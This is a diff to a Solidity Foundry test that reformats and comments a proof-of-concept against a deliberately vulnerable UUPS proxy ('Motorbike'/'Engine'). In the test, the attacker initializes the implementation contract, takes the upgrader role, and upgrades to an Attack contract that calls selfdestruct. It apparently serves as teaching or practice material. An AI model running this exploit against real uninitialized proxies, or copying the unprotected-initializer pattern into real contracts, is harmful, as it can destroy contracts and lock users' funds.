@@ -16,36 +16,44 @@ contract ContractTest is Test {
     address eve = vm.addr(2);
 
     function testSafeMint() public {
-
         EngineContract = new Engine();
-        MotorbikeContract= new Motorbike(address(EngineContract));
+        MotorbikeContract = new Motorbike(address(EngineContract));
         AttackContract = new Attack();
-        console.log("Unitialized Upgrader:",EngineContract.upgrader());
-        address(EngineContract).call(abi.encodeWithSignature("initialize()"));  // call initialize() to become upgrader.
-        console.log("Initialized Upgrader:",EngineContract.upgrader());
+
+        // Engine contract is not initialized
+        console.log("Unintialized Upgrader:", EngineContract.upgrader());
+        // Malicious user calls initialize() on Engine contract to become upgrader.
+        address(EngineContract).call(abi.encodeWithSignature("initialize()"));
+        // Malicious user becomes the upgrader
+        console.log("Initialized Upgrader:", EngineContract.upgrader());
+
+        // Upgrade the implementation of the proxy to a malicious contract and call `attack()`
         bytes memory initEncoded = abi.encodeWithSignature("attack()");
-        address(EngineContract).call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)",address(AttackContract),initEncoded));
+        address(EngineContract).call(
+            abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(AttackContract), initEncoded)
+        );
+
         console.log("Exploit completed");
         console.log("Since EngineContract destroyed, next call will fail.");
-        address(EngineContract).call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)",address(AttackContract),initEncoded));
-}
+        address(EngineContract).call(
+            abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(AttackContract), initEncoded)
+        );
+    }
 }
 
 contract Motorbike {
     // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
-    
+
     struct AddressSlot {
         address value;
     }
-    
+
     // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
-    constructor(address _logic)  {
+    constructor(address _logic) {
         require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
         _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
-        (bool success,) = _logic.delegatecall(
-            abi.encodeWithSignature("initialize()")
-        );
+        (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
         require(success, "Call failed");
     }
 
@@ -62,12 +70,12 @@ contract Motorbike {
         }
     }
 
-    // Fallback function that delegates calls to the address returned by `_implementation()`. 
+    // Fallback function that delegates calls to the address returned by `_implementation()`.
     // Will run if no other function in the contract matches the call data
-    fallback () external payable virtual {
+    fallback() external payable virtual {
         _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
     }
-    
+
     // Returns an `AddressSlot` with member `value` located at `slot`.
     function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
         assembly {
@@ -105,10 +113,7 @@ contract Engine is Initializable {
     }
 
     // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
-    function _upgradeToAndCall(
-        address newImplementation,
-        bytes memory data
-    ) internal {
+    function _upgradeToAndCall(address newImplementation, bytes memory data) internal {
         // Initial upgrade and setup call
         _setImplementation(newImplementation);
         if (data.length > 0) {
@@ -117,16 +122,16 @@ contract Engine is Initializable {
         }
     }
 
-    event Returny(uint256 );
+    event Returny(uint256);
 
-    function greetMe() public  {
+    function greetMe() public {
         emit Returny(0x42);
     }
-    
+
     // Stores a new address in the EIP1967 implementation slot.
     function _setImplementation(address newImplementation) private {
         require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
-        
+
         AddressSlot storage r;
         assembly {
             r.slot := _IMPLEMENTATION_SLOT
@@ -135,8 +140,8 @@ contract Engine is Initializable {
     }
 }
 
-contract Attack{
-    function attack() external{
+contract Attack {
+    function attack() external {
         selfdestruct(payable(msg.sender));
     }
 }
